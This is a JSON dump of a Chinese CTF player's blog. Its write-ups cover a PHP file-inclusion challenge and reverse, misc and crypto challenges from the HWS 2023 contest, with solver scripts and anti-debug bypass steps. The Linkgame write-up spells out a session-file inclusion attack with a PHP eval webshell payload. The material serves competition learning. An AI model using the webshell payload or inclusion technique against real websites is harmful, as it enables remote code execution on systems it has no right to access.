{"meta":{"title":"YuGao's Blog","subtitle":null,"description":"YuGao's Blog","author":"sxyugao","url":"https://sxyugao.top","root":"/"},"pages":[{"title":"About","date":"2018-04-21T13:36:40.000Z","updated":"2023-07-20T16:06:56.684Z","comments":true,"path":"about/index.html","permalink":"https://sxyugao.top/about/index.html","excerpt":"","text":"一名来自浙江前 OIer 蒟蒻，现 CTF 摸鱼选手，喜欢自己胡乱捣鼓东西，希望你能喜欢。 有什么好的建议可以联系我的邮箱或 QQ。 QQ：2645943187 E-mail：sxyugao@qq.com"},{"title":"Friends","date":"2024-08-30T07:40:09.991Z","updated":"2024-08-30T07:40:09.991Z","comments":true,"path":"friends/index.html","permalink":"https://sxyugao.top/friends/index.html","excerpt":"","text":"各位大佬想交换友链的话可以在下方留言，必须要提供名称、头像和链接哦。 名称： sxyugao 头像： https://sxyugao.top/images/avatar.png 网址： https://sxyugao.top"}],"posts":[{"title":"领航杯江苏省赛 2022 Linkgame","slug":"领航杯江苏省赛-2022-Linkgame","date":"2023-04-08T09:43:55.000Z","updated":"2023-04-09T15:33:49.246Z","comments":true,"path":"p/50315424.html","permalink":"https://sxyugao.top/p/50315424.html","excerpt":"整理文件的时候发现自己还写过这个比赛的 WP，大部分是水题就不搬了，留一道有意思的题记录一下吧。","text":"整理文件的时候发现自己还写过这个比赛的 WP，大部分是水题就不搬了，留一道有意思的题记录一下吧。 题目有点久远了，具体内容也忘得差不多了，也没有配套的图片，就将就着看吧（ 在首页点击帮助，发现 url 里有 file 参数，我记得是包含了一个 txt 文件。 于是可以用 php 伪协议读取源码（列出关键部分）： 12345678910111213&lt;?phpif (isset($_GET[&#x27;name&#x27;])) &#123; $_SESSION[&#x27;name&#x27;] = base64_encode($_GET[&#x27;name&#x27;]);&#125;if (empty($_SESSION[&#x27;name&#x27;])) &#123; $_SESSION[&#x27;name&#x27;] = base64_encode(&#x27;me&#x27;);&#125;?&gt;&lt;?php if (isset($_GET[&#x27;file&#x27;])) &#123; include($_GET[&#x27;file&#x27;]);&#125;?&gt; 可以看到 session 是可控的，可以考虑包含 session 来实现 getshell。 如果自定义的话，php 的 session 文件的保存路径可以在 phpinfo 的 session.save_path 看到。 常见的存放位置（路径 + 文件名）： /var/lib/php/sess_PHPSESSID /var/lib/php/sessions/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID 而 PHPSESSID 在发送的请求的 cookie 字段中可以看到。 回到本题，虽然 username 看似被 BASE64 编码了，但是可以通过 php 伪协议来获取解码后的数据，现在唯一问题是如何解决 session 文件格式导致的解码失败问题。 我们先来了解一下 BASE64 编码格式，从一个字符串到 BASE64 编码需要这么几步（以 ab 为例）： 转成 ascii 码：97 98 转成对应 8 位二进制：01100001 01100010 每组 6 位重分组：011000 010110 0010 分组长度不够末尾补零：011000 010110 001000 每组对应转为十进制：24 22 8 查表得：YWI 末尾补零结尾填充 =：YWI= 最后一个 6 位的 BASE64 字节块补四位零，最后附加上两个等号；补两位零，最后附加一个等号。 然后参考 session 文件格式，可以得知 session 文件内容一定形如 username|s:&lt;BASE64字串长度&gt;:&quot;&lt;BASE64字串&gt;&quot;，想办法将 username|s:&lt;BASE64字串长度&gt;:&quot; 填充为正好能被完全分组的形式。 设 BASE64 字串长度的位数为 $x$，解码时 $x$ 满足 $(x + 13) \\times 6 \\equiv 0 \\pmod 8$，取 $x = 3$，即 BASE64 字串的长度大于 100。 由 BASE64 编码的特点，密文和原文的长度比约为 4/3，取 payload &quot;a&quot; * 60 + &quot;&lt;?php eval($_POST['cmd']) ?&gt;&quot; 即可满足，此时密文长度为 120。 通过 ?name= 写入 session 文件，用 ?file= 文件包含，然后蚁剑用密码 cmd 连接即可 getshell。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://sxyugao.top/categories/CTF/Web/"}],"tags":[{"name":"PHP伪协议","slug":"PHP伪协议","permalink":"https://sxyugao.top/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"文件包含","slug":"文件包含","permalink":"https://sxyugao.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"HWS第六期2023冬令营选拔赛 Writeup","slug":"HWS第六期2023冬令营选拔赛-Writeup","date":"2023-03-29T07:14:01.000Z","updated":"2023-04-08T08:04:26.104Z","comments":true,"path":"p/146f06a.html","permalink":"https://sxyugao.top/p/146f06a.html","excerpt":"寒假参加了 HWS 冬令营选拔赛，最近整理文件的时候想着记录一下。 整体比赛难度不大，水了个第十名，主要大佬们都去参加 Real World CTF 了，只有我还在这里摸爬滚打 /(ㄒoㄒ)/~~","text":"寒假参加了 HWS 冬令营选拔赛，最近整理文件的时候想着记录一下。 整体比赛难度不大，水了个第十名，主要大佬们都去参加 Real World CTF 了，只有我还在这里摸爬滚打 /(ㄒoㄒ)/~~ MISC sound from somewhere 听了下音频一眼 SSTV，直接就出了。 can not speak 比赛的时候都根据教程绕过反调试了，但是还是做不下去。 结果比赛比完和我说有非预期，过反调试就能直接在内存里搜索到 flag？而且比赛出题人复现不出正解，真是服了。 首先 DIE 查一下发现是 VMP 壳，这玩意网上都没啥解决方案，只能尝试过反调试。 以下内容均只为步骤搬运，大部分不了解原理，就看着图一乐吧。 把 PEB 调试位清空： 把 gs:[60] 和 gs:[60]+bc 置零 下软件条件断点： NtQueryInformationProcess -&gt; rdx == 0x07 || rdx == 0x1E NtSetInformationThread -&gt; rdx == 0x11 NtQueryInformationProcess 断点命中前一个条件就把 r8 &lt;- 0 运行直至 rdx == 0x1E, 将 r8 &lt;- 0，然后运行到返回，rax &lt;- C0000353 NtSetInformationThread 命中后把 rdx &lt;- 3 禁用软件断点，启用硬件条件断点： NtClose -&gt; rcx == 0xDEADC0DE NtQuerySystemInformation -&gt; rcx == 0x23 选择无视异常运行 NtQuerySystemInformation 命中后执行到返回，将 rax &lt;- 0xC0000001 NtClose 命中后将 rcx &lt;- 0 禁用全部断点，运行一次就到用户代码了 或者你直接用 x96dbg 的插件 ScyllaHide，选择 VMP 的 Profile 就行，它原理主要是把上面的一些检测给 nop 了，但是这个代码会检测自身的完整性，在某个函数里会弹窗说文件被篡改，但在这道题里不影响最终效果（ 过了反调试运行几次，然后右键 -&gt; 搜索 -&gt; 字符串就能直接看到内存里的 flag 了。 REVERSE babyre jadx 打开看了眼，先是有个明显的加密代码，但是感觉没那么简单直接跳过了。 然后发现有个动态加载 dex 文件的代码，又发现有个解密 assets 文件夹下 enc 的代码段。 直接把 enc 解密成 dex，进去发现是一个 AES + BASE64，CyberChef 一下就出了。 P.S. 我其实一开始并不知道这个动态加载 dex 文件是哪里被调用的，后来听讲解才知道是在 AndroidManifest.xml 中定义了 App 启动前的行为。 easyre IDA 大致看了眼，程序结构比较常规，大概是输入个字符串加密然后和密文比较，然后加密是 TEA 系列的加密，比较用的 memcmp。 直接调试发现中途会直接异常退出，想到刚开始新建了线程，猜测是检测了主进程是否长时间挂起，直接退出。然后 hook 了 NtClose 就过了，就没管具体实现了。 动调的时候在加密函数下断拿到了 key，在 memcmp 下断，得到了密文长度和密文。IDA 里看加密函数的时候第一眼以为改了不少，后来发现类似以下代码 12345v8 = v4 + dword_140005728[v6 &amp; 3];v9 = v4 - 1640531527;v10 = (v8 ^ (result + ((16 * result) ^ ((unsigned int)result &gt;&gt; 5)))) + v2;v11 = ((v9 + dword_140005728[(v9 &gt;&gt; 11) &amp; 3]) ^ (v10 + ((16 * v10) ^ (v10 &gt;&gt; 5)))) + result;v12 = (v9 + dword_140005728[v9 &amp; 3]) ^ (v11 + ((16 * v11) ^ (v11 &gt;&gt; 5))); 其中的 v8 都是没用的，中间那一坨都可以改写成一致的形式，就是个改了 delta 方向和数值的 XTEA。 解密拿到原文包上 flag 就出了。 123456789101112131415161718192021222324#include &lt;bits/stdc++.h&gt;using namespace std;unsigned enc[] = &#123;0xC0B29B34, 0xEF30AF6A, 0x98CCB238, 0x85B6F195, 0xA2480685, 0xA63D9B59, 0xF191C71E, 0x6790767B&#125;;unsigned key[] = &#123;0x29, 0x4823, 0x18BE, 0x6784&#125;;const unsigned delta = 1640531527;void decode(unsigned &amp;v0, unsigned &amp;v1) &#123; unsigned sum = -delta * 32; for (int i = 0; i &lt; 32; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]); sum += delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); &#125;&#125;void intToStr(unsigned x) &#123; putchar(x &amp; 0xff); putchar(x &gt;&gt; 0x8 &amp; 0xff); putchar(x &gt;&gt; 0x10 &amp; 0xff); putchar(x &gt;&gt; 0x18 &amp; 0xff);&#125;int main() &#123; for (int i = 0; i &lt; 4; ++i) decode(enc[i &lt;&lt; 1], enc[i &lt;&lt; 1 | 1]); for (unsigned x : enc) intToStr(x);&#125; P.S. 看冬令营的讲解发现在主函数之前有一些操作，寒假里有个 KM 推荐学弟做的 bbctf 也有类似的操作，看到时候能不能开个新坑。 repy 这题比赛的时候没做出来，反而最后一部分的脑洞和出题人对上了，有点难绷。 这题一共分为 3 部分，前 2 个部分都用了控制流平坦化，一点一点来吧。 第一部分其实很简单，当时被吓退了，代码其实并不复杂，甚至可以直接手搓。 大致逻辑如下： 123456789101112bool check(char s[]) &#123; int v[10]; memset(v, 0, sizeof(v)); for (int i = 0; s[i]; ++i) &#123; // ... 省略一些合法性判断，如输入长度为 10 等 ++v[s[i] - &#x27;0&#x27;]; &#125; for (int i = 0; i &lt; 10; ++i) &#123; if (s[i] - &#x27;0&#x27; != v[i]) return 0; &#125; return 1;&#125; 虽然这个手推是个小学奥数题，但是最近刚学了 z3，正好写个脚本一把梭了： 1234567891011121314151617181920212223242526from z3 import *X = [BitVec(f&#x27;X_&#123;i&#125;&#x27;, 5) for i in range(10)]check = [X[i] == (1 - ((((X[0] ^ i) &amp; 8) &gt;&gt; 3) | (((X[0] ^ i) &amp; 4) &gt;&gt; 2) | (((X[0] ^ i) &amp; 2) &gt;&gt; 1) | ((X[0] ^ i) &amp; 1))) + (1 - ((((X[1] ^ i) &amp; 8) &gt;&gt; 3) | (((X[1] ^ i) &amp; 4) &gt;&gt; 2) | (((X[1] ^ i) &amp; 2) &gt;&gt; 1) | ((X[1] ^ i) &amp; 1))) + (1 - ((((X[2] ^ i) &amp; 8) &gt;&gt; 3) | (((X[2] ^ i) &amp; 4) &gt;&gt; 2) | (((X[2] ^ i) &amp; 2) &gt;&gt; 1) | ((X[2] ^ i) &amp; 1))) + (1 - ((((X[3] ^ i) &amp; 8) &gt;&gt; 3) | (((X[3] ^ i) &amp; 4) &gt;&gt; 2) | (((X[3] ^ i) &amp; 2) &gt;&gt; 1) | ((X[3] ^ i) &amp; 1))) + (1 - ((((X[4] ^ i) &amp; 8) &gt;&gt; 3) | (((X[4] ^ i) &amp; 4) &gt;&gt; 2) | (((X[4] ^ i) &amp; 2) &gt;&gt; 1) | ((X[4] ^ i) &amp; 1))) + (1 - ((((X[5] ^ i) &amp; 8) &gt;&gt; 3) | (((X[5] ^ i) &amp; 4) &gt;&gt; 2) | (((X[5] ^ i) &amp; 2) &gt;&gt; 1) | ((X[5] ^ i) &amp; 1))) + (1 - ((((X[6] ^ i) &amp; 8) &gt;&gt; 3) | (((X[6] ^ i) &amp; 4) &gt;&gt; 2) | (((X[6] ^ i) &amp; 2) &gt;&gt; 1) | ((X[6] ^ i) &amp; 1))) + (1 - ((((X[7] ^ i) &amp; 8) &gt;&gt; 3) | (((X[7] ^ i) &amp; 4) &gt;&gt; 2) | (((X[7] ^ i) &amp; 2) &gt;&gt; 1) | ((X[7] ^ i) &amp; 1))) + (1 - ((((X[8] ^ i) &amp; 8) &gt;&gt; 3) | (((X[8] ^ i) &amp; 4) &gt;&gt; 2) | (((X[8] ^ i) &amp; 2) &gt;&gt; 1) | ((X[8] ^ i) &amp; 1))) + (1 - ((((X[9] ^ i) &amp; 8) &gt;&gt; 3) | (((X[9] ^ i) &amp; 4) &gt;&gt; 2) | (((X[9] ^ i) &amp; 2) &gt;&gt; 1) | ((X[9] ^ i) &amp; 1))) for i in range(10)]_range = [And(0 &lt;= X[i], X[i] &lt;= 9) for i in range(10)]s = Solver()s.add(_range + check)if s.check() == sat: t = s.model() res = [t[X[i]].as_long() for i in range(10)] print(&#x27;&#x27;.join(str(x) for x in res))else: print(s.check()) 得到第一问的输入 6210001000。 紧接着程序根据第一问的答案对内存中的数组进行换表，全是控制流平坦化，用了冬令营的时候推荐的插件 D810 进行求解。 反混淆以后发现程序将第二问输入的字符串和处理后的表一一对应了起来，存到一个数组里，中间有一片代码都没对这个数组进行处理（也可能是 IDA 反编译出错了）。 紧接着直接传进 sub_401600 又通过表还原回输入的字符串，然后对其进行 MD5 并与一段已知值比较，破解可得 yOUar3g0oD@tc4nd。 然后就一头雾水了，比赛后根据讲解，左边还有 sub_402930 等函数不在流程中，其中 sub_402930 调用了文件输入输出，内部还有加密，极有可能和剩下两个文件有关。 中间有很多没啥用的垃圾赋值语句，去掉以后连逆带猜得到这个逻辑： 1234567891011121314151617181920int __fastcall sub_402930(char *iv, char *key) &#123; int i, len_iv = strlen(iv); char s[32]; for (i = 0; i &lt; 16; ++i) &#123; s[i + 16] = i &lt; len_iv ? iv[i] : 2; &#125; for (i = 0; i &lt; 16; ++i) &#123; s[i] = key[i]; &#125; char enc[] = &quot;qgapgv,`kl_nbdj`-ejof&quot;; for (i = 0; i &lt; 10; ++i) &#123; enc[i] ^= 2; enc[i + 11] ^= 3; &#125; // enc[] = &quot;secret.bin_magic.file&quot; // ... 读取 magic.file，没啥大用 AES_set_encrypt_key(key, 128, ptr); AES_cbc_encrypt(in, out, len, ptr, s + 16, 1LL); // s + 16 是 iv 填充到 16 位 // ... 写入 secret.bin&#125; 用脚本将 secret.bin 解密： 1234567891011from Crypto.Cipher import AESenc = open(&#x27;secret.bin&#x27;, &#x27;rb&#x27;).read()key = b&#x27;yOUar3g0oD@tc4nd&#x27;iv = b&#x27;6210001000&#x27; + b&#x27;\\x02&#x27; * 6aes = AES.new(key, AES.MODE_CBC, iv)raw = aes.decrypt(enc)with open(&#x27;decrypted.pyc&#x27;, &#x27;wb&#x27;) as f: f.write(raw) 然后是脑洞部分，根据题目名以及题中字符串 But someone told me that he caught 38 giant snakes yesterday..... （Anaconda 有蟒蛇的意思，还告诉了版本是 3.8），或者直接拿 DIE 检测都能知道它是 Python 3.8 的文件。 用 3.8 版本的 python 反汇编字节码发现会报错，检查报错信息发现它通过 JUMP_FORWARD 36 来跳过非法的字节码，同时影响反汇编。 通过 dis.opmap 我们得知 JUMP_FORWARD 36 的字节码为 6E 24，NOP 的字节码为 09。 1234567891011# 注意要 3.8 版本的 pythonimport dis, marshalfor op, opcode in dis.opmap.items(): print(f&#x27;&#123;op&#125;:&#123;opcode&#125;&#x27;)print(&#x27;-----------------------------&#x27;)f = open(&#x27;decrypted.pyc&#x27;, &#x27;rb&#x27;)code = f.read()code = marshal.loads(code[16:])print(dis.dis(code)) 于是我们可以 patch 字节码： 1234567891011121314with open(&#x27;decrypted.pyc&#x27;, &#x27;rb&#x27;) as f: code = bytearray(f.read()) op_len = len(code) for i in range(op_len): if code[i] == 0x6E and code[i + 1] == 0x24: i += 2 nop = 0x24 while nop &gt; 0: code[i] = 0x09 nop -= 1 i += 1with open(&#x27;patched.pyc&#x27;, &#x27;wb&#x27;) as f: f.write(bytes(code)) 然而还是有部分代码无法复原，而且部分 while 有关控制流反编译是错误的，只能去自己阅读字节码。 主函数和之前程序一样只会连逆带猜，总感觉哪里少了点啥，能猜出有个 try 语句块异常处理来让前半段异或上后半段，但是整不出完整的逻辑，因为字节码顺序变得很奇怪，就和前面的 sub_402930 是怎么被调用的一样莫名其妙。 然后再说会能被直接反编译的三个类： II00O0III0o0o0o0oo 类是一个换表 BASE64 IIoo00IIIo0o0oo0oo 类是一个 TEA 系列的加密 chall 类先调用了 II00O0III0o0o0o0oo 类，然后调用 IIoo00IIIo0o0oo0oo 类 也就是说加密逻辑是先换表 BASE64 然后 TEA 系列加密，这样我们就可以开始写脚本了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from string import ascii_uppercase, ascii_lowercase, digitsfrom ctypes import c_uintimport base64class b64: def __init__(self): self.std_table = ascii_uppercase + ascii_lowercase + digits + &#x27;+/&#x27; self.custom_table = list(self.std_table) length = len(self.custom_table) for i in range(0, length // 2): for j in range(0, length - 1 - i): if self.custom_table[j] &gt; self.custom_table[j + 1]: temp = self.custom_table[j] self.custom_table[j] = self.custom_table[j + 1] self.custom_table[j + 1] = temp self.custom_table = &#x27;&#x27;.join(self.custom_table) self.strmap = bytes.maketrans(self.custom_table.encode(), self.std_table.encode()) def b64decode(self, enc): return base64.b64decode(enc.translate(self.strmap)).decode()class TEA: def __init__(self): self.d = 0x87654321 k0 = 1732584193 k1 = 0xEFCDAB89 k2 = 0x98BADCFE k3 = 271733878 self.k = [k0, k1, k2, k3] def TEAdecode(self, v): def MX(x, y, total, key, p, e): a = (x.value &gt;&gt; 6 ^ y.value &lt;&lt; 4) + (y.value &gt;&gt; 2 ^ x.value &lt;&lt; 5) b = (total.value ^ y.value) + (key[p &amp; 3 ^ e.value] ^ x.value) return c_uint(a ^ b) n = len(v) key = self.k delta = self.d rounds = 6 + 52 // n total = c_uint(delta * rounds) e = c_uint(0) for i in range(rounds): e.value = total.value &gt;&gt; 2 &amp; 3 v[n - 1] = c_uint(v[n - 1] - MX(c_uint(v[n - 2]), c_uint(v[0]), total, key, n - 1, e).value).value for p in range(n - 2, 0, -1): v[p] = c_uint(v[p] - MX(c_uint(v[p - 1]), c_uint(v[p + 1]), total, key, p, e).value).value v[0] = c_uint(v[0] - MX(c_uint(v[n - 1]), c_uint(v[1]), total, key, 0, e).value).value total.value -= delta return vclass solver: def __init__(self): self.b64 = b64() self.TEA = TEA() def ints2bytes(self, v): n = len(v) res = b&#x27;&#x27; for i in range(n // 2): res += int.to_bytes(v[2 * i], 4, &#x27;little&#x27;) res += int.to_bytes(v[2 * i + 1], 4, &#x27;little&#x27;) return res def bytes2ints(self, cs): new_length = len(cs) + (8 - len(cs) % 8) % 8 barray = cs.ljust(new_length, b&#x27;\\x00&#x27;) i = 0 v = [] while i &lt; new_length: v0 = int.from_bytes(barray[i:i + 4], &#x27;little&#x27;) v1 = int.from_bytes(barray[i + 4:i + 8], &#x27;little&#x27;) v.append(v0) v.append(v1) i += 8 return v def decode(self, text): tmp = self.TEA.TEAdecode(self.bytes2ints(text)) return self.b64.b64decode(self.ints2bytes(tmp))with open(&#x27;encrypted&#x27;, &#x27;rb&#x27;) as f: sol = solver() enc = bytearray(f.read()) part_1 = enc[:len(enc) // 2] part_2 = enc[len(enc) // 2:] for i in range(len(enc) // 2): part_1[i] ^= part_2[i] print(sol.decode(part_1)) 解出最后一部分是 PytH0n_KZBxDwfkIzbEgUOY，把三部分按题目要求合起来就是 flag。 CRYPTO Numbers Game 发现有随机过程生成了两个长度为 53 的序列，算了下 (128 + 256) / 32 * 52 = 624，正好能满足解出随机数盒的条件。getrandbits 內部实现是反复生成 32 bits 的数，从 LSB 填充到 MSB，多余的 bits 就 drop。正好 128 和 256 都是 32 的倍数，可以完全复原生成的 32 bits 的数。 最后就只要倒推之前的生成的两个数即可。 逆推 state 盒的参考资料：https://badmonkey.site/archives/mt19937.html#2020-vn-招新赛-backtrace 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495import hashlibimport random_id = [&#x27;d5d97afad7ef619b4badd8d2da10ee24&#x27;, &#x27;67f4660a8335fb9f4152a9fbc44c9c77&#x27;, &#x27;8cd43c85ebe9cc7036a37f47ccd1d1e4&#x27;, &#x27;ee3e8c62e8b0100027589d6de82677ef&#x27;, &#x27;463bb2f3731ad0e786302bf78da08330&#x27;, &#x27;e245b1852a3b92734e46eb3421bd76c9&#x27;, &#x27;0b74736786b4ab94651e3b706a548e55&#x27;, &#x27;79cb596b28c2b4e02738f93b5bfbe0d3&#x27;, &#x27;5a9c46837952952045564b5b395acad1&#x27;, &#x27;d3c2d90a05d1a059fbeba4a05a608798&#x27;, &#x27;4da0306c8ab58097d2fef9114e6fcb6d&#x27;, &#x27;9707fabbd3c96de66917f15998ac9201&#x27;, &#x27;9dd3e46fc930abfb523fe31e8ee8a658&#x27;, &#x27;3716a8fd05f7388e7151d09431e61ee1&#x27;, &#x27;9acf027679a6d7a674a43dee4f5bea35&#x27;, &#x27;78702a2b125a940519337b1bf50aff8a&#x27;, &#x27;262cf3b8c8072a602048a24756c83fcf&#x27;, &#x27;092f8d227ec583c4734a6f449de521a3&#x27;, &#x27;712aa300302b57fed458553426348fce&#x27;, &#x27;834d4a0ea451cc04b469636b18c56435&#x27;, &#x27;754b5284b14402c61e3b1e56cb2d41e9&#x27;, &#x27;51d742ca6a341032afcb5dc645f54bfa&#x27;, &#x27;c1a33d104f47e33d6932905b483a2018&#x27;, &#x27;3def7c2a14cff6b2864a2100956df07f&#x27;, &#x27;7e3606e4ec1c99fe5a8593ae44f25a70&#x27;, &#x27;404c6139570883dbab8e5a299d7a5017&#x27;, &#x27;f07597079e1b68ebb4e2d16b83b7b484&#x27;, &#x27;0723daf5c65f8ba6cd6e43fcdf9d18dc&#x27;, &#x27;4c54db12829f165837384b66978e8438&#x27;, &#x27;cd056e64e1f31461cab2e66ece9d3278&#x27;, &#x27;2f6ae16fab122cbce240e32464a1ab57&#x27;, &#x27;f86e0e9ee23498340f62d8617f6f5218&#x27;, &#x27;af4ebe2535885c783c89f8d8c4815076&#x27;, &#x27;c8eae5b5c7aca2c5fdb4f284e2cf65c5&#x27;, &#x27;bec0d8ecabedd9811a8ecb6052b21d8c&#x27;, &#x27;731bd3421b6517aa101357fe1c49caf3&#x27;, &#x27;344f4a26cdaf1a782d9b32208e1a3e92&#x27;, &#x27;892b1741d304878461dd0774a335ea3d&#x27;, &#x27;56e2a484ca40f43e059bf5f0bd822bdc&#x27;, &#x27;d7c0762df71b31c14654147fb9a0595c&#x27;, &#x27;57016a179ba5509f6b04a161ac628b34&#x27;, &#x27;e49a2d573522c1ee3e8348ceca0295a4&#x27;, &#x27;4b0f49c7e6469e82832e9cc90b9e17c0&#x27;, &#x27;eadc9d0c8b75127fe0a7f71881de1ea7&#x27;, &#x27;db9fe5537768207bd8cdf770bcd42dfa&#x27;, &#x27;ba2f57578752628d1ecac419b3a8bc36&#x27;, &#x27;3752e70b5d2b578a8d412d84aab43705&#x27;, &#x27;54e97795df8781c776cbb1ce4f5f31fc&#x27;, &#x27;32794880abc9f68102c24e92ad9c7cd5&#x27;, &#x27;b5eb7e651ca298f6873694c47d1cd3da&#x27;, &#x27;a188934777d2c67e3d59692135005497&#x27;, &#x27;34c308fa1644b387169ea88c1b575490&#x27;]_code = [&#x27;2eebed894580fb900c3615d4866150e68322ff4d48e7509f85ff4543969b0cf6&#x27;, &#x27;017aefd63b4ce14eb376161902d92894a15f680e7b055ce25c3b02c6b49db0a6&#x27;, &#x27;e12d945904032887c967ae03a48c8b096abc79dc64134d872693599d4f6c91cc&#x27;, &#x27;0f8957f365f53a7209baa852905c5da5dba54ddb403ab17a4c9b3a051540d49c&#x27;, &#x27;091e3e41815cd32f482f2cf54ac3338fc918c2a657896af1aa1b23ea528664f4&#x27;, &#x27;5916cd18e8c48c545232112f2179aa7a722350a8a0ced4f1363cc61bc9d83630&#x27;, &#x27;37702710d47a1c17278743253123f6eac85b16d9393432ec65100143bc8657e8&#x27;, &#x27;c3a7006293c48957cba5c010f945483cfdc47650a79d0e8a8a9a52c174244a10&#x27;, &#x27;e1a90a475dd21da64d64ea1dd50a82a622061d08e9d4b3016982c4a0b42f1251&#x27;, &#x27;2f40ff85024765e58ed175927c53e0a279cda96ce755b602f89bfc171108ba3d&#x27;, &#x27;f4f8337dd7267d02638a9cc531c8a02fe0316dd5ff6f8c8aec898c060c6fb217&#x27;, &#x27;0df2f3fe1eb976944a2de5729fca4a12b83c8329b4f514869856ebb94b7d7bf9&#x27;, &#x27;abb2f1277b1cb5ad07254b7f7ed346bcdb73282b306123ce0b5befe42a9e796d&#x27;, &#x27;6ef31ed6a2a465bcd146c2438bf391bfd9f3187cf54afae512220a7a94714bf3&#x27;, &#x27;6981f99ba288923a5cd68908ecc8795bf301f1e7d081ac6580a63902fd52da01&#x27;, &#x27;b6b07975697de1c0342e3711b59165b849125794ef2541c6c60dcf40e689df7b&#x27;, &#x27;20e3af3a2bcedfd15199975cc9edcde14cb13fdff3ea0607a4747601e500aede&#x27;, &#x27;606aa1daf188b9dd5fd6141312f1828846f92baa519e70e5c6923a352421fe2f&#x27;, &#x27;1dc6a60112e99c5b884c0bb5430a7a54eba8aef34fada9cb96bce79a22456cf2&#x27;, &#x27;fd81e36f576119a19185cd12e87544b42f9fcc3dcb5e7ba282b1a128d73d63c5&#x27;, &#x27;7a01e947ca012a5c9a8dd20e693a7788cd6157a5c3fce5fa7c7e09014ea3266e&#x27;, &#x27;ccd162b182c773062514ffc3551ed47f32293700083782d902efc55b1e9795c6&#x27;, &#x27;dbb6115aefd2638eebf44d3be6e9525e09ff036269d954469a0f925b496327a7&#x27;, &#x27;ac08696fe64bb5e58cd3e558463213ca08ab7805e33f45459ae14b35fc5858c6&#x27;, &#x27;6e1594596ad1c656635af29d14b22a5ed10e545442eea5f4e056e20d11aa33b3&#x27;, &#x27;4afd17e64562603c66ce0ca42d544ca48511c3d560f9180c231a9ccb28a0e55e&#x27;, &#x27;06b2d2b24ca626e18fdcb3196e989e3b05150500815511f48200ddea9aacda48&#x27;, &#x27;947a11e8258fd161d02b0eb1b2e8fcd9ff1684a7c75f7c506ddee91f08316f56&#x27;, &#x27;a0e58b15736cab055be1d03860dedb6b8136f6739308c2e0ef6a7490c6b4a1f1&#x27;, &#x27;31476f64f96d72a398e7eb789068b8cfd61ed9cac95d76824a2bbf5b682ea72d&#x27;, &#x27;974259198846a4849d318afd325d860a6e40dfd39e1ed8c7b6d87c990e35efcf&#x27;, &#x27;e93d02ba7079c488c30e377794b4fcc62eeafb6c3f02197f1ebc059e3e5f7f07&#x27;, &#x27;ded96eec0d25c05a54671a001bcd99f5c6d3991d2fdf80afb8f0861a44f3fd64&#x27;, &#x27;86f34c1da65f07634de7c302a6df306dd545806022411a318900bd33b0aff9bd&#x27;, &#x27;59baf4cf3d3b85fcdefd1a9b60c3d78926ff73650ac375c616b30fe9063b377d&#x27;, &#x27;02f2ee251ecc19fa52dd42c0e0b609bc2e7a8ae11ce6ca35396a4bc74d12ac63&#x27;, &#x27;597d09b4c43012b1b4b040d8c62d5fb02d1c4249de4eea06e1447000ba53f50c&#x27;, &#x27;bb87bd8e1903db2df41c349914e9f3591bb032400be6e86ed10e7d292243a374&#x27;, &#x27;cec38960069fdc8090cfbdd166e15ec8a77ce5b4d6b350805a63d2b54cbf0187&#x27;, &#x27;1439d35a9c0caa9cacabe8e6179a02d51ebb9fb51125d5eeaba47ff6b8abcc97&#x27;, &#x27;820d72d49e0fd86ef47b022a3091b326be8b0d2a42f87cbc918737b9972ea62f&#x27;, &#x27;e625e82100031fa4a4410700034859cd4b35c086f5ac2870c6909c16a6831bfc&#x27;, &#x27;f0e22f5167d29331351e1718c17b5420f6a29d84357273e1bfb24c2ff34fa675&#x27;, &#x27;a5a7991f0c5c6a44f68c5c18661611057dbabeff7847623315ce784095645f75&#x27;, &#x27;07cd3f5c5c690214af5feda27b3aec257543a8f96bc509805028a0e95c5d98c6&#x27;, &#x27;6e5dd4405c1b446b9530e4d9356c05b71d1bfcf8a79778588143c3b6fec3fded&#x27;, &#x27;a33f821d277e6f73c09a5ecd14cef80bac29ffe2b917225c27725d2447ac0489&#x27;, &#x27;c18a4a02dd1f7ee65bf5596c53549c286a754afb0e3b90b2369cdd1e43c0b986&#x27;, &#x27;6b8df66aa27b40ca275bc133958b5d543167edf919e7e623a496c9afbf7594d6&#x27;, &#x27;c48124eeef995c7bb705bd240a26dbf6bdbe42ba29addf7ac78fa28dbed3debe&#x27;, &#x27;040eef11dc6e0f3bb3e58e12d2a57ee274071a9c6224f27db70e19a8aa7d4df2&#x27;, &#x27;4ecd0a955e52657fab8dfdac2df4d805f1d08b031df8bce22ac01fe20ca72c5b&#x27;]# right shift inversedef inverse_right(res, shift, bits = 32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &gt;&gt; shift return tmp# right shift with mask inversedef inverse_right_values(res, shift, mask, bits = 32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &gt;&gt; shift &amp; mask return tmp# left shift inversedef inverse_left(res, shift, bits = 32): tmp = res for i in range(bits//shift): tmp = res ^ tmp &lt;&lt; shift return tmp# left shift with mask inversedef inverse_left_values(res, shift, mask, bits = 32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &lt;&lt; shift &amp; mask return tmpdef recover_state(out): state = [] for i in out: i = inverse_right(i, 18) i = inverse_left_values(i, 15, 0xefc60000) i = inverse_left_values(i, 7, 0x9d2c5680) i = inverse_right(i, 11) state.append(i) return statedef backtrace(cur, num): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df state = cur for i in range(num - 1, -1, -1): tmp = state[i + 624] ^ state[i + 397] if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;= 1 res = tmp &amp; high tmp = state[i - 1 + 624] ^ state[i + 396] if tmp &amp; high == high: tmp ^= mask tmp 